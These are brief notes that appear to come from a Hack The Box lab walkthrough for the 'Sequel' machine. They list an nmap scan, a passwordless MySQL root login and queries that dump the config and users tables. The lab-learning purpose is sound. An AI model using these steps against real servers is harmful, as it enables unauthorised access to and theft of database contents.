# Notes for Sequel Machine

## Commands Used

### Terminal Workflow
```
# Nmap scan to identify open ports and services
nmap -sC -sV -p3306 <IP>
```

# Accessing MySQL server as root without a password
```
mysql -h <IP> -u root
```

# Inside the MySQL shell, execute the following queries:
```
SHOW databases;
USE htb;
SHOW tables;
SELECT * FROM config;
SELECT * FROM users;
```
# Exit the MySQL shell
```
exit;
```
